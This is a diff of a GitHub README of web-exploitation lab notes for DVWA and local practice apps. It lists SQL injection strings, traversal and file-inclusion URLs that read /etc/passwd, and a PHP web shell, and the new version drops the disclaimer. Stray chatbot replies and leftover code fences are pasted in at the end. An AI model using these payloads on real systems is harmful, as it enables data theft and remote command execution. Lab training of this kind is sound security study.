@@ -19,174 +19,123 @@ This repository contains a collection of web exploitation techniques focused on 
 
 ## 1. Broken Access Control
 
-### Docker Command
-
-To list running Docker containers:
-
-```bash
+```sh
 sudo docker container ps
 ```
 ````
 
-### SQL Injection in Broken Access Control
+#### SQL Injection Example
 
-Performing SQL injection on the DVWA platform to test access control vulnerabilities.
+- **Basic payload**: `' OR 1=1 #`
+- **To extract passwords**: `' UNION SELECT user, password FROM users #`
 
-#### Basic Payload
+**DVWA Example**:
+
+- **Low Security**:
+
+  - Payload: `test' OR 1=1 --`
+  - Example: `GET /vulnerabilities/sqli/?id=' OR 1=1 #`
+
+- **Medium Security**:
+  - Payload: `1 OR 1=1 #`
+  - To extract passwords: `1 UNION SELECT user, password FROM users #`
+
+**SecureBank SQL Injection**:
 
 ```sql
-GET /vulnerabilities/sqli/?id=' OR 1=1 #
+' UNION SELECT * FROM Transactions --
+' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
+' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, @@version FROM Transactions --
 ```
-
-- **Convert special characters to URL encode** for proper injection.
-- Use the `Ctrl+U` shortcut to view the source code for insights.
-
-#### DVWA SQL Injection Examples
-
-- **Low Security Level**:
-  ```sql
-  Payload: ' OR 1=1 #
-  Password Extraction: ' UNION SELECT user, password FROM users #
-  ```
-- **Medium Security Level**:
-  ```sql
-  Payload: 1 OR 1=1 #
-  Password Extraction: 1 UNION SELECT user, password FROM users #
-  ```
-
-#### SecureBank SQL Injection Examples
-
-- **Union-based SQLi for Table Enumeration**:
-  ```sql
-  ' UNION SELECT * FROM Transactions --
-  ```
-- **Retrieving Specific Information**:
-  ```sql
-  ' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
-  ' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, @@version FROM Transactions --
-  ```
 
 ---
 
-## 2. Directory Traversal
+## Directory Traversal
 
-### Extracting Files via Directory Traversal
-
-```bash
+```sh
 tar -xvf apache-tomcat-8.5.99.tar.gz
 ./catalina.sh run
 ```
 
-Use `wfuzz` to test file paths:
+### Python Virtual Environment Setup
 
-```bash
+```sh
 python3 -m venv venv
 . venv/bin/activate
 wfuzz -w wordlist http://localhost:1337/dynamic-app1/?FUZZ=test
 ```
 
-**Example**: Accessing a hidden file:
-
-```url
-http://localhost:1337/dynamic-app1/?file=../../../secret.txt
-```
-
-### Code Explanation (Directory Traversal Vulnerability)
-
-1. **Retrieve File Parameter**:
-   ```java
-   String file = request.getParameter("file");
-   ```
-2. **File Null Check**:
-   ```java
-   if (file == null) { /* Execute fallback code */ }
-   ```
-3. **Construct Full File Path**:
-   ```java
-   Path path = Paths.get(getServletContext().getRealPath("/") + "/" + file);
-   ```
-4. **Read File Contents**:
-   ```java
-   byte[] data = Files.readAllBytes(path);
-   String s = new String(data, StandardCharsets.UTF_8);
-   out.println(s);
-   ```
+- **Example to Access Secret File**:
+  ```sh
+  http://localhost:1337/dynamic-app1/?file=../../../secret.txt
+  ```
 
 ---
 
-## 3. File Inclusion
+## 2. File Inclusion Vulnerabilities
 
-### Local File Inclusion (LFI)
-
-Retrieve sensitive files using Local File Inclusion.
-
-```url
-http://localhost/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
+```sh
+/app?page=main&username=<username>
 ```
 
-### PHP Filters for LFI
+#### Local File Inclusion (LFI) Example
 
-1. Encode files in base64 to view sensitive data:
+- **Low Security**:
 
-   ```url
-   http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
-   ```
+  ```sh
+  http://localhost/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
+  ```
 
-   Decode the base64 string to get the `/etc/passwd` content.
+- **Medium Security**:
+
+  ```sh
+  http://localhost/vulnerabilities/fi/?page=....//....//....//etc/passwd
+  ```
+
+- **Hard Security**:
+  ```sh
+  http://localhost/vulnerabilities/fi/?page=file4.php../../../../etc/passwd
+  ```
+
+#### PHP Filter
+
+- **Base64 Encoding for Low Security**:
+
+  ```sh
+  http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+  ```
+
+  Decode the base64 string to get the `/etc/passwd` content.
 
 ---
 
 ## 4. File Upload Vulnerabilities
 
-### Level 1 - Unrestricted File Upload
+### Basic File Server Setup
 
-1. **Create a PHP shell script**:
-   ```php
-   <?php system($_REQUEST['cmd']); ?>
-   ```
-2. **Execute commands via URL**:
-   ```url
-   http://localhost:7070/uploads/level1-thumbnail.php?cmd=whoami
-   ```
+```sh
+cd <www-directory>
+php -S 127.0.0.1:7070
+touch hello.php
+echo "<?php echo 'hello world'; ?>" > hello.php
+```
 
-### Level 2 - File Extension Check Bypass
-
-1. Intercept the upload request using a tool like Burp Suite.
-2. Change `Content-Type` from `application/x-php` to `image/png`.
-3. **Execute Commands**:
-   ```url
-   http://localhost:7070/uploads/level2-thumbnail.php?cmd=whoami
-   ```
-
-### Level 3 - Image File Check Bypass
-
-1. **Modify Image File Header**:
-   Use a PHP payload in the first part of an image file to bypass checks.
-2. **Execute Commands**:
-   ```php
-   <?php system($_REQUEST['cmd']); ?>
-   ```
+- **Basic Exploit**:
+  - Upload `shell.php` with content:
+    ```php
+    <?php system($_REQUEST['cmd']); ?>
+    ```
+  - Access with URL: `http://localhost:7070/uploads/level1-thumbnail.php?cmd=whoami`
 
 ---
 
-### Important Notes
+Enjoy exploring, and remember to use these commands responsibly!
 
-- Always validate and sanitize user inputs to prevent vulnerabilities.
-- Use tools like **wfuzz** for fuzzing and **Burp Suite** for intercepting requests.
-- **Convert special characters to URL encoding** where necessary.
-
-### Disclaimer
-
-These techniques are for educational purposes and should only be used in authorized environments. Unauthorized access or testing without permission is illegal.
+```
 
 ---
 
-### References
-
-- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
-- [OWASP File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)
-
+This Markdown file will display as organized sections with clear headings and code blocks, making it easy to read on GitHub! Let me know if you'd like any further customization.
 ```
 
 This README should help with clarity, easy navigation, and adherence to ethical usage of these techniques. Let me know if there are any additional sections or if you'd like further elaboration on specific parts!
-```
